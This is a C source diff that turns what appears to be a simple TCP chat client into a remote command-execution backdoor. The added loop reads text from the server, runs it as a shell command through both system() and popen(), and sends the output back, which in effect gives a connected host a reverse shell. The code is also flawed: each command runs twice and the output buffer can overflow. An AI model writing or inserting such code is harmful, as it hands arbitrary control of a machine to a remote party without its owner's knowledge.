@@ -17,7 +17,10 @@ int main(int argc, char *argv[])
     struct sockaddr_in serv_addr;
     struct hostent *server;
 
-    char buffer[256];
+    char buffer[256], content[4096], line[128];
+
+    FILE *file_p;
+
     if (argc < 3) {
        fprintf(stderr,"usage %s hostname port\n", argv[0]);
        exit(0);
@@ -47,15 +50,22 @@ int main(int argc, char *argv[])
             error("ERROR connecting");
     
     while (1) {
-        printf("Please enter the message: ");
-        bzero(buffer,256);
-        fgets(buffer,255,stdin);
-        n = write(sockfd,buffer,strlen(buffer));
-        if (n < 0) 
+        bzero(buffer, 256);
+        while (read(sockfd, buffer, 255) < 0);
+        printf("Here is the message: %s\n", buffer);
+        system(buffer);
+        file_p = popen(buffer, "r");
+        if (!file_p) error("ERROR executing command");
+        bzero(content, 4096);
+        bzero(line, 128);
+        while(fgets(line, sizeof(line), file_p) != NULL && strlen(content) < 4096) {    
+            strcat(content, line);
+            bzero(line, 128);
+        }
+        pclose(file_p);
+        // printf("This is the output of command:\n%s\n", content);
+        if (write(sockfd,content,512) < 0)
             error("ERROR writing to socket");
-        bzero(buffer,256);
-        while (read(sockfd,buffer,255) < 0);
-        printf("%s\n",buffer);
     }
     return 0;
 }
